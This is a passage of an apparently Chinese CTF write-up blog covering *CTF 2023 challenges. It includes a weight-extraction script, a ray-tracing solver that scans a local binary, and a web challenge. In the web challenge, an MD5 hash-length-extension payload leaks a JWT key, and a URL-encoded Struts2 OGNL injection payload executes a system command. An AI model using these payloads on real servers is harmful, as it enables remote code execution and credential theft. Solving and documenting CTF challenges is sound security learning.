+</span></span><span style="display:flex;"><span>            c <span style="color:#f92672">=</span> round(float(filter_bias[b]), <span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>            ss <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>a<span style="color:#e6db74">}</span><span style="color:#e6db74">,</span><span style="color:#e6db74">{</span>b<span style="color:#e6db74">}</span><span style="color:#e6db74">,</span><span style="color:#e6db74">{</span>c<span style="color:#e6db74">}</span><span style="color:#e6db74">#&#34;</span>
+</span></span><span style="display:flex;"><span>        bypass_weight <span style="color:#f92672">=</span> net<span style="color:#f92672">.</span>state_dict()[<span style="color:#e6db74">&#39;bypass.weight&#39;</span>]
+</span></span><span style="display:flex;"><span>        a <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">181</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>):
+</span></span><span style="display:flex;"><span>                d <span style="color:#f92672">=</span> round(float(bypass_weight[b][c]), <span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>                ss <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>a<span style="color:#e6db74">}</span><span style="color:#e6db74">,</span><span style="color:#e6db74">{</span>b<span style="color:#e6db74">}</span><span style="color:#e6db74">,</span><span style="color:#e6db74">{</span>c<span style="color:#e6db74">}</span><span style="color:#e6db74">,</span><span style="color:#e6db74">{</span>d<span style="color:#e6db74">}</span><span style="color:#e6db74">#&#34;</span>
+</span></span><span style="display:flex;"><span>        res<span style="color:#f92672">.</span>append(ss)
+</span></span><span style="display:flex;"><span>        print(res)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span><span style="color:#e6db74">}</span><span style="color:#e6db74">done!&#34;</span>)
+</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;181.txt&#39;</span>,<span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    mmm <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> m <span style="color:#f92672">in</span> res:
+</span></span><span style="display:flex;"><span>        mmm <span style="color:#f92672">+=</span> m[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>        mmm <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;|&#39;</span>
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(mmm[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+</span></span></code></pre></div><p><img src="https://gkjzjh146.github.io/2023_ctf.assets/image-20230801175116740.png" alt="image-20230801175116740"></p>
+<h2 id="ray-tracing">ray tracing</h2>
+<h3 id="解法1官方wp">解法1(官方wp)</h3>
+<ol>
+<li>由题目可知，我们需要通过向空间中发射光线来&rsquo;照亮&rsquo;空间中的flag，可供输入的参数为光线的原点和方向（由光线路径上的一点和原点共同确定）。</li>
+<li>于是首先通过分别固定x,y,z轴发射光线，扫描出正视图，俯视图和侧视图，并由正视图和俯视图得到一部分flag。</li>
+<li>有一部分字母在正视图和俯视图中都只表现为一条短线，说明该字母在空间中应该是侧过来放置的。但是仅通过侧视图无法得到所有侧放的字母，因为光线只有方向没有长度，如果只扫描侧视图会导致部分字母的侧视图投影叠加，无法区分。因此我们采用斜45°发射光线的方式予以扫描。</li>
+<li>最终得到flag:AHHLF#AItDELFDLDE#tIHt,加上*ctf{}即可</li>
+</ol>
+<p><a href="https://github.com/sixstars/starctf2023/tree/main/misc-raytracing">starctf2023/misc-raytracing at main · sixstars/starctf2023 · GitHub</a></p>
+<p>运行要arm架构，懒得弄了。。。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(executable_file):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> subprocess<span style="color:#f92672">.</span>Popen(
+</span></span><span style="display:flex;"><span>        executable_file,
+</span></span><span style="display:flex;"><span>        stdin<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE,
+</span></span><span style="display:flex;"><span>        stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE,
+</span></span><span style="display:flex;"><span>        stderr<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read</span>(process):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> process<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>readline()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write</span>(process, message):
+</span></span><span style="display:flex;"><span>    process<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>message<span style="color:#f92672">.</span>strip()<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>    process<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>flush()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">terminate</span>(process):
+</span></span><span style="display:flex;"><span>    process<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>    process<span style="color:#f92672">.</span>terminate()
+</span></span><span style="display:flex;"><span>    process<span style="color:#f92672">.</span>wait(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.2</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DEBUG_INFO <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">cast_ray</span>(start:tuple, end:tuple, process):
+</span></span><span style="display:flex;"><span>    a <span style="color:#f92672">=</span> read(process)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> DEBUG_INFO:
+</span></span><span style="display:flex;"><span>        print(a)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> coordinate <span style="color:#f92672">in</span> start:
+</span></span><span style="display:flex;"><span>        write(process, str(coordinate))
+</span></span><span style="display:flex;"><span>        a <span style="color:#f92672">=</span> read(process)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> DEBUG_INFO:
+</span></span><span style="display:flex;"><span>            print(a)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    a <span style="color:#f92672">=</span> read(process)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> DEBUG_INFO:
+</span></span><span style="display:flex;"><span>        print(a)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> coordinate <span style="color:#f92672">in</span> end:
+</span></span><span style="display:flex;"><span>        write(process, str(coordinate))
+</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> read(process)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> DEBUG_INFO:
+</span></span><span style="display:flex;"><span>            print(result)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> result <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;Miss!&#34;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># print(&#34;X&#34;)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;.&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> result <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;Hit!&#34;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># print(&#34;Y&#34;)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;√&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print(result)</span>
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> read(process)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> DEBUG_INFO:
+</span></span><span style="display:flex;"><span>        print(result)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> result <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;Miss!&#34;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># print(&#34;X&#34;)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;.&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> result <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;Hit!&#34;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># print(&#34;Y&#34;)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;√&#34;</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>process <span style="color:#f92672">=</span> start(<span style="color:#e6db74">&#34;./rt&#34;</span>)
+</span></span><span style="display:flex;"><span>print(read(process))
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(read(process))</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># write(process, &#34;1&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># result = read(process)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(result)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># if result == &#34;Miss!&#34;:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#     print(&#34;X&#34;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(read(process))</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># cast_ray((0,0,0),(100,100,100),process)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>scan_result <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>y_range <span style="color:#f92672">=</span> <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>x_range <span style="color:#f92672">=</span> <span style="color:#ae81ff">4000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># xy</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,y_range,<span style="color:#ae81ff">10</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,x_range,<span style="color:#ae81ff">10</span>):
+</span></span><span style="display:flex;"><span>        ret <span style="color:#f92672">=</span> cast_ray((x,y_range<span style="color:#f92672">-</span>y,<span style="color:#ae81ff">0</span>),(x,y_range<span style="color:#f92672">-</span>y,<span style="color:#ae81ff">40</span>),process)
+</span></span><span style="display:flex;"><span>        print(ret, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#34; &#34;</span>)
+</span></span><span style="display:flex;"><span>        scan_result<span style="color:#f92672">.</span>append(ret)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># print(&#34;casted!\n&#34;)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># if y &lt; 50:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#     continue</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># exit(0)</span>
+</span></span><span style="display:flex;"><span>    print()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>y_range <span style="color:#f92672">=</span> <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>x_range <span style="color:#f92672">=</span> <span style="color:#ae81ff">4000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># xy</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,y_range,<span style="color:#ae81ff">10</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,x_range,<span style="color:#ae81ff">10</span>):
+</span></span><span style="display:flex;"><span>        ret <span style="color:#f92672">=</span> cast_ray((x<span style="color:#f92672">+</span><span style="color:#ae81ff">30</span>,y_range<span style="color:#f92672">-</span>y,<span style="color:#ae81ff">0</span>),(x,y_range<span style="color:#f92672">-</span>y,<span style="color:#ae81ff">40</span>),process)
+</span></span><span style="display:flex;"><span>        print(ret, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#34; &#34;</span>)
+</span></span><span style="display:flex;"><span>        scan_result<span style="color:#f92672">.</span>append(ret)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># print(&#34;casted!\n&#34;)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># if y &lt; 50:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#     continue</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># exit(0)</span>
+</span></span><span style="display:flex;"><span>    print()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##### xz</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,y_range,<span style="color:#ae81ff">10</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,x_range,<span style="color:#ae81ff">10</span>):
+</span></span><span style="display:flex;"><span>        ret <span style="color:#f92672">=</span> cast_ray((x,<span style="color:#ae81ff">0</span>,y_range<span style="color:#f92672">-</span>y),(x,<span style="color:#ae81ff">40</span>,y_range<span style="color:#f92672">-</span>y),process)
+</span></span><span style="display:flex;"><span>        print(ret, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#34; &#34;</span>)
+</span></span><span style="display:flex;"><span>        scan_result<span style="color:#f92672">.</span>append(ret)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># print(&#34;casted!\n&#34;)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># if y &lt; 50:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#     continue</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># exit(0)</span>
+</span></span><span style="display:flex;"><span>    print()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##### yz</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># y_range = 200</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># z_range = 200    </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># x_range = 1000</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># x_interval = 120</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># for x in range(450,x_range,x_interval):</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#     for y in range(0,y_range,10):</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#         for z in range(0,z_range,10):</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#             ray_origin = (x,y_range-y,z)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#             ray_end = (x+x_interval,y_range-y,z)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#             # print(ray_origin, ray_end)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#             ret = cast_ray(ray_origin,ray_end,process)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#             print(ret, end=&#34; &#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#             scan_result.append(ret)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#             # print(&#34;casted!\n&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#             # if y &lt; 50:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#             #     continue</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#             # exit(0)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#         print()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##### Oblique example</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##### vary x to get all characters</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># y_range = 200</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># z_range = 200    </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># x_range = 700</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># x_interval = 120</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># x_start = 650</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># for x in range(x_start,x_range,x_interval):</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#     for y in range(0,y_range,10):</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#         for z in range(0,z_range,10):</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#             ray_origin = (x,y_range-y,z)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#             ray_end = (x+x_interval,y_range-y,z-120)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#             # print(ray_origin, ray_end)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#             ret = cast_ray(ray_origin,ray_end,process)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#             print(ret, end=&#34; &#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#             scan_result.append(ret)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#             # print(&#34;casted!\n&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#             # if y &lt; 50:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#             #     continue</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#             # exit(0)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#         print()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>y_range <span style="color:#f92672">=</span> <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>z_range <span style="color:#f92672">=</span> <span style="color:#ae81ff">200</span>    
+</span></span><span style="display:flex;"><span>x_range <span style="color:#f92672">=</span> <span style="color:#ae81ff">1620</span>
+</span></span><span style="display:flex;"><span>x_interval <span style="color:#f92672">=</span> <span style="color:#ae81ff">120</span>
+</span></span><span style="display:flex;"><span>x_start <span style="color:#f92672">=</span> <span style="color:#ae81ff">1510</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(x_start,x_range,x_interval):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,y_range,<span style="color:#ae81ff">10</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> z <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,z_range,<span style="color:#ae81ff">10</span>):
+</span></span><span style="display:flex;"><span>            ray_origin <span style="color:#f92672">=</span> (x,y_range<span style="color:#f92672">-</span>y,z)
+</span></span><span style="display:flex;"><span>            ray_end <span style="color:#f92672">=</span> (x<span style="color:#f92672">+</span>x_interval,y_range<span style="color:#f92672">-</span>y,z<span style="color:#f92672">+</span>x_interval)
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># print(ray_origin, ray_end)</span>
+</span></span><span style="display:flex;"><span>            ret <span style="color:#f92672">=</span> cast_ray(ray_origin,ray_end,process)
+</span></span><span style="display:flex;"><span>            print(ret, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#34; &#34;</span>)
+</span></span><span style="display:flex;"><span>            scan_result<span style="color:#f92672">.</span>append(ret)
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># print(&#34;casted!\n&#34;)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># if y &lt; 50:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">#     continue</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># exit(0)</span>
+</span></span><span style="display:flex;"><span>        print()
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>x_start <span style="color:#f92672">=</span> <span style="color:#ae81ff">1760</span>
+</span></span><span style="display:flex;"><span>x_range <span style="color:#f92672">=</span> <span style="color:#ae81ff">1880</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(x_start,x_range,x_interval):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,y_range,<span style="color:#ae81ff">10</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> z <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,z_range,<span style="color:#ae81ff">10</span>):
+</span></span><span style="display:flex;"><span>            ray_origin <span style="color:#f92672">=</span> (x,y_range<span style="color:#f92672">-</span>y,z)
+</span></span><span style="display:flex;"><span>            ray_end <span style="color:#f92672">=</span> (x<span style="color:#f92672">+</span>x_interval,y_range<span style="color:#f92672">-</span>y,z<span style="color:#f92672">+</span>x_interval)
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># print(ray_origin, ray_end)</span>
+</span></span><span style="display:flex;"><span>            ret <span style="color:#f92672">=</span> cast_ray(ray_origin,ray_end,process)
+</span></span><span style="display:flex;"><span>            print(ret, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#34; &#34;</span>)
+</span></span><span style="display:flex;"><span>            scan_result<span style="color:#f92672">.</span>append(ret)
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># print(&#34;casted!\n&#34;)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># if y &lt; 50:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">#     continue</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># exit(0)</span>
+</span></span><span style="display:flex;"><span>        print()
+</span></span><span style="display:flex;"><span>           
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># for x in range(0,2000,10):</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#     for y in range(0,2000,10):</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#         print(scan_result)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>terminate(process)
+</span></span></code></pre></div><h3 id="解法2-1">解法2</h3>
+<p>逆向把数据提取出来，用建模软件搭建出来，切换角度看</p>
+<p><a href="https://mp.weixin.qq.com/s/3dDkNdWmLsph3CUQPoDYKA">https://mp.weixin.qq.com/s/3dDkNdWmLsph3CUQPoDYKA</a></p>
+<h1 id="web">web</h1>
+<h2 id="jwt2struts">jwt2struts</h2>
+<p>F12看源码可以看到<code>hint</code>，<code>JWT_key.php</code></p>
+<pre tabindex="0"><code>&lt;?php
+highlight_file(__FILE__);
+include &#34;./secret_key.php&#34;;
+include &#34;./salt.php&#34;;
+//$salt = XXXXXXXXXXXXXX // the salt include 14 characters
+//md5($salt.&#34;adminroot&#34;)=e6ccbf12de9d33ec27a5bcfb6a3293df
+@$username = urldecode($_POST[&#34;username&#34;]);
+@$password = urldecode($_POST[&#34;password&#34;]);
+if (!empty($_COOKIE[&#34;digest&#34;])) {
+    if ($username === &#34;admin&#34; &amp;&amp; $password != &#34;root&#34;) {
+         if ($_COOKIE[&#34;digest&#34;] === md5($salt.$username.$password)) {
+            die (&#34;The secret_key is &#34;. $secret_key);
+        }
+        else {
+            die (&#34;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&#34;);
+        }
+    }
+    else {
+        die (&#34;no no no&#34;);
+    }
+}
+</code></pre><p>易得hash扩展攻击</p>
+<p><code>$salt</code>长度为14，并且知道hash值</p>
+<p><img src="https://gkjzjh146.github.io/2023_ctf.assets/image-20230801173301055.png" alt="image-20230801173301055"></p>
+<p><code>$password</code> 为</p>
+<p><code>root\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00aaa</code></p>
+<p>编码一下可以得到</p>
+<p><code>root%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%b8%00%00%00%00%00%00%00aaa</code></p>
+<p>可以得到jwt_key:<code>sk-he00lctf3r</code></p>
+<p>在jwt.io中改token</p>
+<p>struts2漏洞，直接打就行了</p>
+<pre tabindex="0"><code>%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27printenv+FLAG%27%29.getInputStream%28%29%29%29+%2B+%27
+</code></pre>
               
 
 
